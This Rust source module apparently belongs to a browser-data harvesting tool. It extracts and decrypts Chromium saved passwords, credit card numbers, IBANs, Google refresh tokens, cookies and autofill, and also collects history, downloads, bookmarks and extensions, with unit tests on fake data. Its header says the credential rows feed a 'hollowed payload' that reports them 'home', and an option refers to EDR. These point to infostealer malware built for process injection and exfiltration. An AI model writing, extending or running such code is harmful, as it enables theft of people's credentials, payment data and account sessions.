//! Chromium store extraction: `Login Data` (+ account variant), `Web Data`,
//! `Cookies`, `History`, `Bookmarks`, and the `Secure Preferences` /
//! `Preferences` extension registry.
//!
//! Credential-class rows are streamed through a sink so the Windows hollowed
//! payload can report them home; plaintext rows land directly in the report.

use std::collections::HashMap;
use std::path::Path;

use base64::Engine;
use rusqlite::Connection;

use crate::crypt;
use crate::inventory::{Browser, Family, Profile};
use crate::model::{Autofill, Card, Cookie, Iban, Login, ProfileSummary, Token};
use crate::model::{Bookmark, Download, Extension, HistoryEntry, Report, Row};
use crate::options::RunOptions;
use crate::stores::{
    self, blob, count_rows, count_since, each_row, int, limit_clause, note_error, open_store, text,
};
use crate::timestamp;

/// Extracts the credential-class stores (logins, cookies, cards, IBANs,
/// tokens, autofill) of one Chromium profile, streaming each row to `sink`.
/// The aggregate `max_items` cap is the caller's job (`Report::row_fits`).
pub(crate) fn credential_rows(
    browser: &Browser,
    profile: &Profile,
    bag: &crypt::KeyBag,
    opts: &RunOptions,
    summary: &mut ProfileSummary,
    errors: &mut Vec<String>,
    sink: &mut dyn FnMut(Row),
) {
    if browser.family != Family::Chromium {
        return;
    }
    if opts.wants_artifact("credentials") {
        for store in ["Login Data", "Login Data For Account"] {
            if let Some((db, _snap)) =
                open_store(&profile.path.join(store), browser, profile, store, errors)
            {
                logins(&db, browser, profile, bag, opts, summary, errors, sink);
            }
        }
        if let Some((db, _snap)) = open_store(
            &profile.path.join("Web Data"),
            browser,
            profile,
            "Web Data",
            errors,
        ) {
            credit_cards(&db, browser, profile, bag, opts, errors, sink);
            ibans(&db, browser, profile, bag, opts, errors, sink);
            oauth_tokens(&db, browser, profile, bag, opts, errors, sink);
        }
    }
    if opts.wants_artifact("cookies") {
        for candidate in [
            profile.path.join("Network/Cookies"),
            profile.path.join("Cookies"),
        ] {
            if candidate.is_file() {
                if let Some((db, _snap)) =
                    open_store(&candidate, browser, profile, "cookies", errors)
                {
                    cookies(&db, browser, profile, bag, opts, summary, errors, sink);
                }
                break;
            }
        }
    }
    if opts.wants_artifact("autofill") {
        if let Some((db, _snap)) = open_store(
            &profile.path.join("Web Data"),
            browser,
            profile,
            "Web Data",
            errors,
        ) {
            autofill(&db, browser, profile, opts, errors, sink);
        }
    }
}

/// Extracts the plaintext (non-credential) stores of one Chromium profile:
/// history, downloads, bookmarks, extensions. These carry no secrets and are
/// always read locally — on Windows, even when credential stores went through
/// the hollowed payload.
pub(crate) fn plaintext_rows(
    browser: &Browser,
    profile: &Profile,
    opts: &RunOptions,
    report: &mut Report,
    summary: &mut ProfileSummary,
    errors: &mut Vec<String>,
) {
    if browser.family != Family::Chromium {
        return;
    }
    if opts.wants_artifact("history") || opts.wants_artifact("downloads") {
        if let Some((db, _snap)) = open_store(
            &profile.path.join("History"),
            browser,
            profile,
            "History",
            errors,
        ) {
            if opts.wants_artifact("history") {
                history(&db, browser, profile, opts, report, summary, errors);
            }
            if opts.wants_artifact("downloads") {
                downloads(&db, browser, profile, opts, report, errors);
            }
        }
    }
    if opts.wants_artifact("bookmarks") {
        bookmarks(
            &profile.path.join("Bookmarks"),
            browser,
            profile,
            opts,
            report,
            errors,
        );
    }
    if opts.wants_artifact("extensions") {
        for prefs in ["Secure Preferences", "Preferences"] {
            let path = profile.path.join(prefs);
            if path.is_file() {
                extensions(&path, browser, profile, opts, report);
                break;
            }
        }
    }
}

#[allow(clippy::too_many_arguments)]
fn logins(
    db: &Connection,
    browser: &Browser,
    profile: &Profile,
    bag: &crypt::KeyBag,
    opts: &RunOptions,
    summary: &mut ProfileSummary,
    errors: &mut Vec<String>,
    sink: &mut dyn FnMut(Row),
) {
    // Exact exposure count first — independent of the max_items sample cap.
    summary.credential_count = summary
        .credential_count
        .saturating_add(count_rows(db, "SELECT COUNT(*) FROM logins"));
    let sql = format!(
        "SELECT origin_url, action_url, username_value, password_value, \
         date_created, date_last_used, times_used FROM logins{}",
        limit_clause(opts.max_items)
    );
    each_row(db, &sql, [], browser, profile, "logins", errors, |row| {
        let secret = blob(row, 3);
        let password_stored = !secret.is_empty();
        let password = crypt::unwrap_value(bag, &secret)
            .map(|p| String::from_utf8_lossy(&p).into_owned())
            .unwrap_or_default();
        sink(Row::Login(Login {
            browser: browser.id.to_string(),
            profile: profile.name.clone(),
            origin_url: text(row, 0),
            action_url: text(row, 1),
            username: text(row, 2),
            password,
            password_stored,
            date_created: timestamp::chrome_us_to_iso(int(row, 4)),
            date_last_used: timestamp::chrome_us_to_iso(int(row, 5)),
            times_used: int(row, 6).clamp(0, u32::MAX as i64) as u32,
        }));
        false
    });
}

fn credit_cards(
    db: &Connection,
    browser: &Browser,
    profile: &Profile,
    bag: &crypt::KeyBag,
    opts: &RunOptions,
    errors: &mut Vec<String>,
    sink: &mut dyn FnMut(Row),
) {
    let sql = format!(
        "SELECT guid, name_on_card, expiration_month, expiration_year, \
         card_number_encrypted, date_modified FROM credit_cards{}",
        limit_clause(opts.max_items)
    );
    each_row(
        db,
        &sql,
        [],
        browser,
        profile,
        "credit_cards",
        errors,
        |row| {
            let secret = blob(row, 4);
            let number = crypt::unwrap_value(bag, &secret)
                .map(|p| String::from_utf8_lossy(&p).into_owned())
                .unwrap_or_default();
            sink(Row::Card(Card {
                browser: browser.id.to_string(),
                profile: profile.name.clone(),
                name: text(row, 1),
                // The ciphertext itself is the always-safe exposure proof.
                number_enc: base64::engine::general_purpose::STANDARD.encode(&secret),
                number,
                expiry_month: int(row, 2).clamp(0, 12) as u32,
                expiry_year: int(row, 3).clamp(0, 9999) as u32,
                billing_address: String::new(),
                date_added: timestamp::chrome_us_to_iso(int(row, 5)),
            }));
            false
        },
    );
}

fn ibans(
    db: &Connection,
    browser: &Browser,
    profile: &Profile,
    bag: &crypt::KeyBag,
    opts: &RunOptions,
    errors: &mut Vec<String>,
    sink: &mut dyn FnMut(Row),
) {
    let sql = format!(
        "SELECT value_encrypted, nickname FROM local_ibans{}",
        limit_clause(opts.max_items)
    );
    each_row(
        db,
        &sql,
        [],
        browser,
        profile,
        "local_ibans",
        errors,
        |row| {
            let secret = blob(row, 0);
            let iban = crypt::unwrap_value(bag, &secret)
                .map(|p| String::from_utf8_lossy(&p).into_owned())
                .unwrap_or_default();
            sink(Row::Iban(Iban {
                browser: browser.id.to_string(),
                profile: profile.name.clone(),
                name: text(row, 1),
                iban,
                bic: String::new(),
                bank_name: String::new(),
                account_number: String::new(),
                date_added: String::new(),
            }));
            false
        },
    );
}

fn oauth_tokens(
    db: &Connection,
    browser: &Browser,
    profile: &Profile,
    bag: &crypt::KeyBag,
    opts: &RunOptions,
    errors: &mut Vec<String>,
    sink: &mut dyn FnMut(Row),
) {
    // Newer schemas carry a per-token binding key; fall back when absent.
    let has_binding = db
        .prepare("SELECT service, encrypted_token, binding_key FROM token_service LIMIT 1")
        .is_ok();
    let sql = if has_binding {
        format!(
            "SELECT service, encrypted_token, binding_key FROM token_service{}",
            limit_clause(opts.max_items)
        )
    } else {
        format!(
            "SELECT service, encrypted_token FROM token_service{}",
            limit_clause(opts.max_items)
        )
    };
    each_row(
        db,
        &sql,
        [],
        browser,
        profile,
        "token_service",
        errors,
        |row| {
            let secret = blob(row, 1);
            let token = crypt::unwrap_value(bag, &secret)
                .map(|p| String::from_utf8_lossy(&p).into_owned())
                .unwrap_or_default();
            // token_service holds Google account refresh tokens; the service name
            // identifies the account binding.
            sink(Row::Token(Token {
                browser: browser.id.to_string(),
                profile: profile.name.clone(),
                provider: "google".to_string(),
                client_id: text(row, 0),
                access_token: String::new(),
                refresh_token: token,
                token_type: String::new(),
                expires_in: 0,
                scope: Vec::new(),
                created_at: String::new(),
            }));
            false
        },
    );
}

#[allow(clippy::too_many_arguments)]
fn cookies(
    db: &Connection,
    browser: &Browser,
    profile: &Profile,
    bag: &crypt::KeyBag,
    opts: &RunOptions,
    summary: &mut ProfileSummary,
    errors: &mut Vec<String>,
    sink: &mut dyn FnMut(Row),
) {
    // Exact exposure count first — independent of the max_items sample cap.
    summary.cookie_count = summary
        .cookie_count
        .saturating_add(count_rows(db, "SELECT COUNT(*) FROM cookies"));
    let sql = format!(
        "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, \
         encrypted_value, value FROM cookies{}",
        limit_clause(opts.max_items)
    );
    each_row(db, &sql, [], browser, profile, "cookies", errors, |row| {
        let host = text(row, 0);
        let secret = blob(row, 6);
        // Chromium prefers encrypted_value; the plaintext `value` column is
        // the fallback for rows written unencrypted (crypto disabled or
        // legacy pre-encryption records) — mirroring the upstream loader.
        let value = crypt::unwrap_cookie(bag, &host, &secret)
            .filter(|v| !v.is_empty())
            .unwrap_or_else(|| text(row, 7));
        sink(Row::Cookie(Cookie {
            browser: browser.id.to_string(),
            profile: profile.name.clone(),
            host,
            name: text(row, 1),
            path: text(row, 2),
            value,
            is_secure: int(row, 3) != 0,
            is_httponly: int(row, 4) != 0,
            expires: timestamp::chrome_us_to_iso(int(row, 5)),
        }));
        false
    });
}

fn history(
    db: &Connection,
    browser: &Browser,
    profile: &Profile,
    opts: &RunOptions,
    report: &mut Report,
    summary: &mut ProfileSummary,
    errors: &mut Vec<String>,
) {
    let cutoff = stores::chrome_cutoff_us(opts.history_days);
    // Exact exposure count first — independent of the max_items sample cap.
    summary.history_count = summary.history_count.saturating_add(count_since(
        db,
        "SELECT COUNT(*) FROM urls WHERE last_visit_time >= ?1",
        cutoff,
    ));
    let sql = format!(
        "SELECT url, title, visit_count, last_visit_time FROM urls \
         WHERE last_visit_time >= ?1 ORDER BY last_visit_time DESC{}",
        limit_clause(opts.max_items)
    );
    each_row(
        db,
        &sql,
        rusqlite::params![cutoff],
        browser,
        profile,
        "urls",
        errors,
        |row| {
            if opts.max_items != 0 && report.history.len() >= opts.max_items as usize {
                return true;
            }
            report.history.push(HistoryEntry {
                browser: browser.id.to_string(),
                profile: profile.name.clone(),
                url: text(row, 0),
                title: text(row, 1),
                visit_count: int(row, 2).clamp(0, u32::MAX as i64) as u32,
                last_visit: timestamp::chrome_us_to_iso(int(row, 3)),
            });
            false
        },
    );
}

fn downloads(
    db: &Connection,
    browser: &Browser,
    profile: &Profile,
    opts: &RunOptions,
    report: &mut Report,
    errors: &mut Vec<String>,
) {
    // The URL chain is a separate table; first URL per download wins.
    let mut urls: HashMap<i64, String> = HashMap::new();
    if let Ok(mut stmt) =
        db.prepare("SELECT id, url FROM downloads_url_chains ORDER BY id, chain_index")
    {
        if let Ok(mut rows) = stmt.query([]) {
            while let Ok(Some(row)) = rows.next() {
                urls.entry(int(row, 0)).or_insert_with(|| text(row, 1));
            }
        }
    }
    let cutoff = stores::chrome_cutoff_us(opts.history_days);
    let sql = format!(
        "SELECT id, target_path, total_bytes, received_bytes, state, start_time, end_time \
         FROM downloads WHERE start_time >= ?1 ORDER BY start_time DESC{}",
        limit_clause(opts.max_items)
    );
    each_row(
        db,
        &sql,
        rusqlite::params![cutoff],
        browser,
        profile,
        "downloads",
        errors,
        |row| {
            if opts.max_items != 0 && report.downloads.len() >= opts.max_items as usize {
                return true;
            }
            let id = int(row, 0);
            report.downloads.push(Download {
                browser: browser.id.to_string(),
                profile: profile.name.clone(),
                url: urls.get(&id).cloned().unwrap_or_default(),
                target_path: text(row, 1),
                total_bytes: int(row, 2).clamp(0, i64::MAX) as u64,
                received_bytes: int(row, 3).clamp(0, i64::MAX) as u64,
                state: stores::download_state(int(row, 4)).to_string(),
                started_at: timestamp::chrome_us_to_iso(int(row, 5)),
                finished_at: timestamp::chrome_us_to_iso(int(row, 6)),
            });
            false
        },
    );
}

fn autofill(
    db: &Connection,
    browser: &Browser,
    profile: &Profile,
    opts: &RunOptions,
    errors: &mut Vec<String>,
    sink: &mut dyn FnMut(Row),
) {
    let sql = format!(
        "SELECT name, value, count FROM autofill{}",
        limit_clause(opts.max_items)
    );
    each_row(db, &sql, [], browser, profile, "autofill", errors, |row| {
        sink(Row::Autofill(Autofill {
            browser: browser.id.to_string(),
            profile: profile.name.clone(),
            name: text(row, 0),
            value: text(row, 1),
            count: int(row, 2).clamp(0, u32::MAX as i64) as u32,
        }));
        false
    });
}

fn bookmarks(
    path: &Path,
    browser: &Browser,
    profile: &Profile,
    opts: &RunOptions,
    report: &mut Report,
    errors: &mut Vec<String>,
) {
    if !path.is_file() {
        return; // absent: not an error
    }
    let Ok(content) = std::fs::read_to_string(path) else {
        note_error(errors, browser, profile, "Bookmarks", "unreadable");
        return;
    };
    let Ok(json) = serde_json::from_str::<serde_json::Value>(&content) else {
        note_error(errors, browser, profile, "Bookmarks", "malformed json");
        return;
    };
    let Some(roots) = json.get("roots").and_then(serde_json::Value::as_object) else {
        note_error(errors, browser, profile, "Bookmarks", "unexpected schema");
        return;
    };
    // The budget is cumulative across profiles (a per-profile reset would let
    // every profile emit max_items more than the last).
    let mut remaining = opts
        .max_items
        .saturating_sub((report.bookmarks.len() as u32).min(opts.max_items));
    for (root_name, root) in roots {
        walk_bookmarks(
            root,
            root_name,
            browser,
            profile,
            opts,
            report,
            &mut remaining,
        );
    }
}

#[allow(clippy::too_many_arguments)]
fn walk_bookmarks(
    node: &serde_json::Value,
    folder: &str,
    browser: &Browser,
    profile: &Profile,
    opts: &RunOptions,
    report: &mut Report,
    remaining: &mut u32,
) {
    if opts.max_items != 0 && *remaining == 0 {
        return;
    }
    match node.get("type").and_then(serde_json::Value::as_str) {
        Some("url") => {
            report.bookmarks.push(Bookmark {
                browser: browser.id.to_string(),
                profile: profile.name.clone(),
                title: node
                    .get("name")
                    .and_then(serde_json::Value::as_str)
                    .unwrap_or_default()
                    .to_string(),
                url: node
                    .get("url")
                    .and_then(serde_json::Value::as_str)
                    .unwrap_or_default()
                    .to_string(),
                folder: folder.to_string(),
                added_at: node
                    .get("date_added")
                    .and_then(serde_json::Value::as_str)
                    .and_then(|s| s.parse::<i64>().ok())
                    .map(timestamp::chrome_us_to_iso)
                    .unwrap_or_default(),
            });
            *remaining = remaining.saturating_sub(1);
        }
        Some("folder") => {
            let name = node
                .get("name")
                .and_then(serde_json::Value::as_str)
                .unwrap_or_default();
            let sub = if name.is_empty() {
                folder.to_string()
            } else {
                format!("{folder}/{name}")
            };
            if let Some(children) = node.get("children").and_then(serde_json::Value::as_array) {
                for child in children {
                    walk_bookmarks(child, &sub, browser, profile, opts, report, remaining);
                }
            }
        }
        _ => {}
    }
}

fn extensions(
    path: &Path,
    browser: &Browser,
    profile: &Profile,
    opts: &RunOptions,
    report: &mut Report,
) {
    let Ok(content) = std::fs::read_to_string(path) else {
        return;
    };
    let Ok(json) = serde_json::from_str::<serde_json::Value>(&content) else {
        return;
    };
    let Some(settings) = json
        .get("extensions")
        .and_then(|e| e.get("settings"))
        .and_then(serde_json::Value::as_object)
    else {
        return;
    };
    for (id, entry) in settings {
        if opts.max_items != 0 && report.extensions.len() >= opts.max_items as usize {
            break;
        }
        let manifest = entry.get("manifest");
        let name = manifest
            .and_then(|m| m.get("name"))
            .and_then(serde_json::Value::as_str)
            .unwrap_or_default()
            .to_string();
        let version = manifest
            .and_then(|m| m.get("version"))
            .and_then(serde_json::Value::as_str)
            .unwrap_or_default()
            .to_string();
        let permissions = manifest
            .and_then(|m| m.get("permissions"))
            .and_then(serde_json::Value::as_array)
            .map(|list| {
                list.iter()
                    .filter_map(serde_json::Value::as_str)
                    .map(str::to_string)
                    .collect()
            })
            .unwrap_or_default();
        // Modern Chrome records `active_bit` (bool); older builds used the
        // `state` enum (1 = enabled). Prefer the former, tolerate the latter,
        // default to enabled when neither is present.
        let enabled = entry
            .get("active_bit")
            .and_then(serde_json::Value::as_bool)
            .or_else(|| {
                entry
                    .get("state")
                    .and_then(serde_json::Value::as_i64)
                    .map(|st| st == 1)
            })
            .unwrap_or(true);
        report.extensions.push(Extension {
            browser: browser.id.to_string(),
            profile: profile.name.clone(),
            id: id.clone(),
            name,
            version,
            enabled,
            permissions,
        });
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use aes_gcm::aead::{Aead, KeyInit, Payload};
    use aes_gcm::{Aes256Gcm, Key, Nonce};

    const TEST_KEY: [u8; 32] = [7u8; 32];

    fn seal(plain: &[u8]) -> Vec<u8> {
        let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(&TEST_KEY));
        let nonce = [3u8; 12];
        let ct = cipher
            .encrypt(
                Nonce::from_slice(&nonce),
                Payload {
                    msg: plain,
                    aad: b"",
                },
            )
            .unwrap();
        let mut blob = b"v20".to_vec();
        blob.extend_from_slice(&nonce);
        blob.extend_from_slice(&ct);
        blob
    }

    fn fixture(tag: &str) -> (std::path::PathBuf, Profile, Browser) {
        let root = std::env::temp_dir().join(format!(
            "crumble-test-chromium-{tag}-{}",
            std::process::id()
        ));
        let _ = std::fs::remove_dir_all(&root);
        let profile_path = root.join("Default");
        std::fs::create_dir_all(&profile_path).unwrap();

        let conn = Connection::open(profile_path.join("Login Data")).unwrap();
        conn.execute(
            "CREATE TABLE logins (origin_url TEXT, action_url TEXT, username_value TEXT, \
             password_value BLOB, date_created INTEGER, date_last_used INTEGER, times_used INTEGER)",
            [],
        )
        .unwrap();
        conn.execute(
            "INSERT INTO logins VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)",
            rusqlite::params![
                "https://example.com/login",
                "https://example.com/auth",
                "user@example.com",
                seal(b"hunter2"),
                13_364_654_400_i64 * 1_000_000,
                0_i64,
                3_i64
            ],
        )
        .unwrap();
        drop(conn);

        let conn = Connection::open(profile_path.join("Web Data")).unwrap();
        conn.execute(
            "CREATE TABLE credit_cards (guid TEXT, name_on_card TEXT, expiration_month INTEGER, \
             expiration_year INTEGER, card_number_encrypted BLOB, date_modified INTEGER)",
            [],
        )
        .unwrap();
        conn.execute(
            "INSERT INTO credit_cards VALUES ('g1', 'J Doe', 12, 2030, ?1, 0)",
            rusqlite::params![seal(b"4111111111111111")],
        )
        .unwrap();
        conn.execute(
            "CREATE TABLE token_service (service TEXT, encrypted_token BLOB)",
            [],
        )
        .unwrap();
        conn.execute(
            "INSERT INTO token_service VALUES ('AccountId-1', ?1)",
            rusqlite::params![seal(b"1//refresh")],
        )
        .unwrap();
        conn.execute(
            "CREATE TABLE local_ibans (value_encrypted BLOB, nickname TEXT)",
            [],
        )
        .unwrap();
        conn.execute(
            "CREATE TABLE autofill (name TEXT, value TEXT, count INTEGER)",
            [],
        )
        .unwrap();
        conn.execute(
            "INSERT INTO autofill VALUES ('email', 'user@example.com', 9)",
            [],
        )
        .unwrap();
        drop(conn);

        let def = Browser {
            id: "chrome",
            label: "Chrome",
            family: Family::Chromium,
            user_data: root.clone(),
            safe_storage: "",
            abe: None,
            exe_candidates: Vec::new(),
        };
        let profile = Profile {
            name: "Default".to_string(),
            display_name: "Person 1".to_string(),
            path: profile_path,
            is_default: true,
        };
        (root, profile, def)
    }

    #[test]
    fn logins_cards_tokens_decrypt_with_key() {
        let (root, profile, def) = fixture("decrypt");
        let opts = RunOptions {
            artifacts: vec!["credentials".into()],
            ..Default::default()
        };
        let bag = crypt::KeyBag {
            app_bound: Some(TEST_KEY),
            ..Default::default()
        };
        let mut report = Report::default();
        let mut summary = ProfileSummary::default();
        let mut errors = Vec::new();
        credential_rows(
            &def,
            &profile,
            &bag,
            &opts,
            &mut summary,
            &mut errors,
            &mut |row| {
                if report.row_fits(&row, opts.max_items) {
                    report.push_row(row);
                }
            },
        );

        assert_eq!(summary.credential_count, 1);
        assert_eq!(report.credentials.len(), 1);
        let cred = &report.credentials[0];
        assert_eq!(cred.origin_url, "https://example.com/login");
        assert_eq!(cred.username, "user@example.com");
        assert_eq!(cred.password, "hunter2");
        assert!(cred.password_stored);
        assert_eq!(cred.date_created, "2024-07-05T12:00:00Z");
        assert_eq!(cred.times_used, 3);

        assert_eq!(report.credit_cards.len(), 1);
        assert_eq!(report.credit_cards[0].number, "4111111111111111");
        assert!(!report.credit_cards[0].number_enc.is_empty());
        assert_eq!(report.oauth_tokens.len(), 1);
        assert_eq!(report.oauth_tokens[0].refresh_token, "1//refresh");
        assert_eq!(report.autofill.len(), 0, "autofill not selected");
        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn without_key_rows_count_but_stay_sealed() {
        let (root, profile, def) = fixture("sealed");
        let opts = RunOptions {
            artifacts: vec!["credentials".into()],
            ..Default::default()
        };
        let mut report = Report::default();
        let mut summary = ProfileSummary::default();
        let mut errors = Vec::new();
        credential_rows(
            &def,
            &profile,
            &crypt::KeyBag::default(),
            &opts,
            &mut summary,
            &mut errors,
            &mut |row| report.push_row(row),
        );
        assert_eq!(summary.credential_count, 1);
        assert_eq!(report.credentials.len(), 1);
        assert!(report.credentials[0].password.is_empty());
        assert!(report.credentials[0].password_stored);
        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn collection_depends_only_on_selection_and_keys() {
        // Row content is a function of the store + keys + artifact selection,
        // never of output formatting options: two differently-shaped option
        // sets that both select credentials produce identical rows.
        let (root1, profile1, def1) = fixture("cfg-a");
        let (root2, profile2, def2) = fixture("cfg-b");
        let run = |def: &Browser, profile: &Profile, opts: &RunOptions| {
            let bag = crypt::KeyBag {
                app_bound: Some(TEST_KEY),
                ..Default::default()
            };
            let mut report = Report::default();
            let mut summary = ProfileSummary::default();
            let mut errors = Vec::new();
            credential_rows(
                def,
                profile,
                &bag,
                opts,
                &mut summary,
                &mut errors,
                &mut |row| report.push_row(row),
            );
            (report, summary, errors)
        };
        let a = RunOptions {
            artifacts: vec!["credentials".into(), "autofill".into()],
            history_days: 7,
            ..Default::default()
        };
        let b = RunOptions {
            max_items: 99,
            respect_edr: true,
            format: crate::options::Format::Jsonl,
            ..a.clone()
        };
        let (r_a, s_a, e_a) = run(&def1, &profile1, &a);
        let (r_b, s_b, e_b) = run(&def2, &profile2, &b);
        assert_eq!(r_a, r_b);
        assert_eq!(s_a.credential_count, s_b.credential_count);
        assert_eq!(e_a, e_b);
        assert_eq!(r_a.credentials[0].password, "hunter2");
        assert_eq!(r_a.autofill.len(), 1);
        let _ = std::fs::remove_dir_all(&root1);
        let _ = std::fs::remove_dir_all(&root2);
    }

    #[test]
    fn extensions_active_bit_and_state_enum() {
        let root = std::env::temp_dir().join(format!("crumble-test-ext-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        let profile_path = root.join("Default");
        std::fs::create_dir_all(&profile_path).unwrap();
        std::fs::write(
            profile_path.join("Secure Preferences"),
            r#"{"extensions":{"settings":{
                "aaa":{"active_bit":true,"manifest":{"name":"Ext A","version":"1.0","permissions":["tabs","cookies"]}},
                "bbb":{"active_bit":false,"disable_reasons":[1],"manifest":{"name":"Ext B","version":"2.0"}},
                "ccc":{"manifest":{"name":"Legacy C","version":"3.0"},"state":0}
            }}}"#,
        )
        .unwrap();
        let def = Browser {
            id: "chrome",
            label: "Chrome",
            family: Family::Chromium,
            user_data: root.clone(),
            safe_storage: "",
            abe: None,
            exe_candidates: Vec::new(),
        };
        let profile = Profile {
            name: "Default".to_string(),
            display_name: String::new(),
            path: profile_path,
            is_default: true,
        };
        let opts = RunOptions {
            artifacts: vec!["extensions".into()],
            ..Default::default()
        };
        let mut report = Report::default();
        let mut summary = ProfileSummary::default();
        let mut errors = Vec::new();
        plaintext_rows(
            &def,
            &profile,
            &opts,
            &mut report,
            &mut summary,
            &mut errors,
        );
        assert_eq!(report.extensions.len(), 3);
        let a = report.extensions.iter().find(|e| e.id == "aaa").unwrap();
        assert!(a.enabled);
        assert_eq!(a.permissions, vec!["tabs", "cookies"]);
        assert!(
            !report
                .extensions
                .iter()
                .find(|e| e.id == "bbb")
                .unwrap()
                .enabled
        );
        // Legacy `state` enum honored when active_bit is absent.
        assert!(
            !report
                .extensions
                .iter()
                .find(|e| e.id == "ccc")
                .unwrap()
                .enabled
        );
        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn missing_stores_are_tolerated() {
        let root = std::env::temp_dir().join(format!("crumble-test-empty-{}", std::process::id()));
        let profile_path = root.join("Default");
        std::fs::create_dir_all(&profile_path).unwrap();
        let def = Browser {
            id: "chrome",
            label: "Chrome",
            family: Family::Chromium,
            user_data: root.clone(),
            safe_storage: "",
            abe: None,
            exe_candidates: Vec::new(),
        };
        let profile = Profile {
            name: "Default".to_string(),
            display_name: String::new(),
            path: profile_path,
            is_default: true,
        };
        let opts = RunOptions::default();
        let mut report = Report::default();
        let mut summary = ProfileSummary::default();
        let mut errors = Vec::new();
        // Must not panic on an empty profile.
        credential_rows(
            &def,
            &profile,
            &crypt::KeyBag::default(),
            &opts,
            &mut summary,
            &mut errors,
            &mut |_| {},
        );
        plaintext_rows(
            &def,
            &profile,
            &opts,
            &mut report,
            &mut summary,
            &mut errors,
        );
        assert!(report.credentials.is_empty());
        let _ = std::fs::remove_dir_all(&root);
    }
}
